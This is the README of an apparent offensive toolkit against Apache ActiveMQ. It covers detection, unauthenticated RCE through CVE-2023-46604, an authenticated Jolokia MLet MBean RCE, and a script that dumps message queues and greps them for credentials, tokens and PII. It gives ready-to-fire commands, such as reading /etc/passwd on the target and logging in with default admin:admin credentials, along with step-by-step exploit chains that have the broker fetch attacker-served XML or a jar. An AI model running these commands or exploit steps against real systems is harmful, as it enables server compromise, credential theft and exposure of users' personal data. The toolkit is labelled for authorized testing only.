# ActiveMQ Toolkit

Authorized testing only. Detection + two RCE primitives + lateral movement enumeration.

## Layout

```
standalones/activemq/
├── _activemq_lib.sh                # shared helpers
├── activemq-quickwin.sh            # detect + tier classifier
├── activemq-cve-2023-46604.py      # unauth OpenWire RCE (port 61616)
├── activemq-jolokia-rce.sh         # admin-auth MLet RCE (port 8161)
├── activemq-queues.sh              # lateral intel: dump queue contents
└── payloads/
    └── README.md
```

## Quickstart

```bash
# 1. Detect — single host or list from your nmap scan
./activemq-quickwin.sh --target 10.0.0.5:8161
./activemq-quickwin.sh --targets ../../outputs/acme/raw/_targets_activemq.txt -o out

# 2. CRITICAL hosts via the OpenWire port — try unauth RCE first
#    Default behaviour is DRY-RUN (prints plan, exits 0). Add --exploit to fire.
./activemq-cve-2023-46604.py --target 10.0.0.5:61616 \\
    --cmd 'id > /tmp/p; uname -a >> /tmp/p; cat /etc/passwd >> /tmp/p' \\
    --exploit

# 3. Hosts with admin web console — MBean upload RCE
#    Same gate: --exploit required to actually load the MBean.
./activemq-jolokia-rce.sh --target 10.0.0.5:8161 --user admin --pass admin \\
    --cmd 'id > /tmp/jolokia.out' \\
    --exploit

# 4. Even without RCE: dump queues for inter-service creds, JWTs, PII
./activemq-queues.sh --target 10.0.0.5:8161 --user admin --pass admin -o queues
```

## Version exposure (`activemq-quickwin.sh` --tier output)

| Condition | Tier | Path |
|---|---|---|
| OpenWire port 61616 open + version < 5.18.3/5.17.6/5.16.7/5.15.16 | **CRITICAL** | `activemq-cve-2023-46604.py` — no auth needed |
| Web console 8161 + admin:admin or other default creds | **CRITICAL** | `activemq-jolokia-rce.sh` |
| Web console 8161 + version reachable but creds rejected | HIGH | Cred-spray candidate |
| AMQP 5672 / STOMP 61613 only | MEDIUM | Message-protocol auth attempt |
| Reachable, nothing useful | LOW | — |

## CVE-2023-46604 — what it actually does

ActiveMQ's OpenWire `ExceptionMarshaller` calls `Class.forName(name).newInstance()` on the class name pulled from network input. The attack passes:

```
org.springframework.context.support.ClassPathXmlApplicationContext
```

with a single constructor arg — a URL. Spring fetches that URL, parses the XML as a bean config, and instantiates every bean. A `ProcessBuilder` bean with `init-method="start"` runs your command as the broker user.

The PoC script:
1. Generates the Spring XML containing your shell command
2. Stands up an HTTP server on the attacker box
3. Sends a crafted OpenWire frame to port 61616
4. Broker fetches the XML over HTTP → instantiates the bean → executes
5. HTTP server is held briefly to give the broker time to fetch

Fixed in 5.18.3 / 5.17.6 / 5.16.7 / 5.15.16. Anything older is vulnerable.

## Jolokia MLet RCE — admin path

When the web console accepts your creds:

1. Build a tiny `SystemExec` MBean whose constructor calls `ProcessBuilder.start(...)`
2. Wrap it in a `SystemExec:name=SystemExec` MLet descriptor + ship both via a local HTTP server
3. POST to `/api/jolokia/exec/JMImplementation:type=MLet/getMBeansFromURL/<url>`
4. The broker fetches the MLet, downloads the .jar, loads the class, runs the constructor

Requires `javac` + `jar` to build the MBean (or pass `--jar prebuilt.jar`).

## Queue dump — when RCE is blocked but auth works

`activemq-queues.sh` enumerates every queue + topic via Jolokia, calls `browseMessages()` on each, and greps the raw bodies for credential patterns (AWS keys, JWTs, Slack/Stripe tokens, postgres URLs, raw `"password":...` JSON, etc.). Messages frequently contain:

- Inter-service auth tokens for downstream APIs
- Pending welcome / password-reset emails with reset URLs
- Session correlation IDs that can be replayed
- User PII (names, emails, addresses)
- Internal hostnames and DB query parameters

## Build the prebuilt MBean once

```bash
# Optional — speeds up Jolokia exploitation if you don't have JDK on the attack box.
# Use this to compile once, then pass --jar to activemq-jolokia-rce.sh
cd payloads
# (see payloads/README.md for build instructions)
```

## Notes

- The `MagicID` in the OpenWire greeting is `ActiveMQ` plus a version byte; if you're seeing connection resets without that, you may have hit a load balancer that doesn't pass-through OpenWire.
- Some hardened deployments disable `getMBeansFromURL` — the response will say so. In that case, try other JMX MBeans available in the broker (look at the `jolokia_list.json` from `quickwin`).
- ActiveMQ Artemis is a different codebase. CVE-2023-46604 does NOT apply. Detection in `quickwin.sh` checks for the "ActiveMQ" string in the OpenWire greeting; Artemis uses different protocol port semantics.
